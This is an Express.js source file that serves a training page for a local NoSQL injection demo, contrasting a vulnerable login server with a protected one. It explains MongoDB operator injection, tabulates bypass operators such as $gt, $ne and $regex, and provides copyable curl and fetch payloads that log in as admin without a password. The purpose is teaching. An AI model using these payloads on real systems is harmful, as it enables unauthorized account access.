/*
 * Terminal 2: cd demo-attacked/nosql-injection && npm run guide
 */

const express = require('express');

const app = express();
const PORT = 3023;
const VICTIM_PORT = 3022;
const PROTECTED_PORT = 3024;

const CURL_PAYLOAD = [
  'curl -s -X POST http://localhost:' + VICTIM_PORT + '/login \\',
  "  -H 'Content-Type: application/json' \\",
  "  -d '{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}' \\",
  '  -L',
].join('\n');

const FETCH_PAYLOAD = [
  "fetch('http://localhost:" + VICTIM_PORT + "/login', {",
  "  method: 'POST',",
  "  headers: { 'Content-Type': 'application/json' },",
  "  body: JSON.stringify({ username: 'admin', password: { $gt: '' } })",
  "}).then(r => console.log('Redirected to:', r.url))",
].join('\n');

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function buildGuideHtml() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NoSQL Injection — Attack Guide</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
      max-width: 720px;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
      min-width: 70px;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #16a34a;
      color: #fff;
      border-color: #16a34a;
    }
    .target-switcher .btn-protected.active {
      background: #15803d;
      color: #fff;
      border-color: #ef4444;
    }
  </style>
</head>
<body>
  <h1>NoSQL Injection — Attack Guide</h1>
  <p class="subtitle">How operator injection bypasses MongoDB authentication</p>

  <div class="flow-box" style="max-width:900px">
    <strong>HOW MONGODB LOGIN QUERIES WORK</strong><br><br>
    <pre>// Normal login — what the developer intended
db.users.findOne({ username: "alice", password: "hunter2" })
// → returns user object only if both fields match exactly</pre>
  </div>

  <div class="flow-box" style="max-width:900px">
    <strong>THE INJECTION</strong><br><br>
    <pre>// What the attacker sends (HTTP request body):
{ "username": "admin", "password": { "$gt": "" } }

// What Express parses and the server builds:
db.users.findOne({ username: "admin", password: { $gt: "" } })
// → "$gt": "" means "password greater than empty string"
// → any non-empty password satisfies this — admin is returned
// → attacker is logged in without knowing the password</pre>
  </div>

  <div class="credentials-panel">
    <h2>Other Operators That Work</h2>
    <table>
      <thead>
        <tr>
          <th>Payload</th>
          <th>Effect</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><code>{ "$gt": "" }</code></td>
          <td>Greater than empty string — matches any non-empty password</td>
        </tr>
        <tr>
          <td><code>{ "$ne": "x" }</code></td>
          <td>Not equal to "x" — matches any password except "x"</td>
        </tr>
        <tr>
          <td><code>{ "$regex": ".*" }</code></td>
          <td>Regex match-all — matches anything</td>
        </tr>
        <tr>
          <td><code>{ "$exists": true }</code></td>
          <td>Field exists — matches any user with a password field</td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="credentials-panel" style="margin-top:2rem">
    <h2>Copy Payloads</h2>
    <div style="margin-bottom:1.25rem">
      <div style="font-size:0.72rem;color:#64748b;margin-bottom:0.4rem">curl (login bypass)</div>
      <pre id="curl-payload">${escapeHtml(CURL_PAYLOAD)}</pre>
      <button type="button" class="demo-btn btn-copy" data-target="curl-payload">Copy</button>
    </div>
    <div>
      <div style="font-size:0.72rem;color:#64748b;margin-bottom:0.4rem">browser console fetch</div>
      <pre id="fetch-payload">${escapeHtml(FETCH_PAYLOAD)}</pre>
      <button type="button" class="demo-btn btn-copy" data-target="fetch-payload">Copy</button>
    </div>
  </div>

  <div class="credentials-panel" style="margin-top:2rem">
    <h2>Why JSON Endpoints Are Specifically Vulnerable</h2>
    <p style="font-size:0.85rem;color:#94a3b8;line-height:1.7;max-width:640px">
      This attack only works because the endpoint accepts JSON
      (Content-Type: application/json) and express.json() parses nested objects.
      A form-encoded endpoint (application/x-www-form-urlencoded) cannot send a
      nested object — password[$gt]= arrives as the literal string "$gt=".
      JSON is required for object injection.<br><br>
      SQL injection does not have this limitation — it works on any string input.
      That is why SQL and NoSQL injection have different but equally dangerous
      attack surfaces.
    </p>
  </div>

  <div class="target-switcher">
    <button type="button" class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (:${VICTIM_PORT})</button>
    <button type="button" class="btn-protected" id="btn-switcher-protected">Protected (:${PROTECTED_PORT})</button>
  </div>

  <script>
    document.querySelectorAll('.btn-copy').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var id = btn.getAttribute('data-target');
        var text = document.getElementById(id).textContent;
        navigator.clipboard.writeText(text).then(function () {
          btn.textContent = 'Copied!';
          setTimeout(function () { btn.textContent = 'Copy'; }, 1500);
        });
      });
    });
    document.getElementById('btn-switcher-vulnerable').addEventListener('click', function () {
      window.open('http://localhost:${VICTIM_PORT}/login', '_blank');
    });
    document.getElementById('btn-switcher-protected').addEventListener('click', function () {
      window.open('http://localhost:${PROTECTED_PORT}/login', '_blank');
    });
  </script>
</body>
</html>`;
}

app.get('/', function (req, res) {
  res.send(buildGuideHtml());
});

app.listen(PORT, function () {
  console.log('NoSQL attack guide running at http://localhost:' + PORT);
});
